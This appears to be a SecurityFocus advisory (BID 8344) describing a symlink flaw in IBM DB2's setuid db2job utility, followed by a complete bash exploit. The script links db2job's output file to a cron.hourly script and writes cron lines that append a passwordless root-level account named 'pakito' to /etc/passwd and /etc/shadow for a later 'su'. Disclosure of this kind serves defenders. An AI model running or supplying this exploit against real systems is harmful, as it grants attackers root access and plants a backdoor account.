source: http://www.securityfocus.com/bid/8344/info

IBM's DB2 database ships with a utility called db2job, installed with permissions 4550 and owned by root.db2asgrp. 

It has been reported that db2job writes to a number of files with root privileges. The files written to are created with 0770 permissions (owner, group writeable) and are owned by root.db2asgrp. If a symbolic link is written to, the file pointed to will be overwritten and given these permissions. This can be exploited by local attackers with execute privileges to gain root access by writing malicious data to sensitive files (such as /etc/passwd, /etc/shadow) that have been overwritten.

It should be noted, however, that db2job is allegedly not world-executable by default. The two members of group db2asgrp, db2as and db2inst1, are the only users besides root that would normally have execute access. If the attacker can run commands or gain the access level of those accounts, they may further elevate their access level through exploitation of this vulnerability.

#!/bin/bash

DB2JOB=/home/db2as/sqllib/adm/db2job
CRONFILE=/etc/cron.hourly/pakito
USER=pakito

unset DB2INSTANCE
export DB2DIR=./trash

if [ -d $DB2DIR ]; then
echo Trash directory already created
else
mkdir $DB2DIR
fi

cd $DB2DIR
if [ -f ./0_1.out ]; then
echo Link Already Created
else
ln -s $CRONFILE ./0_1.out
fi

$DB2JOB


echo "echo "#!/bin/bash"" > $CRONFILE
echo "echo "$USER:x:0:0::/:/bin/bash" >> /etc/passwd" >> $CRONFILE
echo "echo "$USER::12032:0:99999:7:::" >> /etc/shadow" >> $CRONFILE
echo " must wait until cron execute $CRONFILE and then exec su pakito"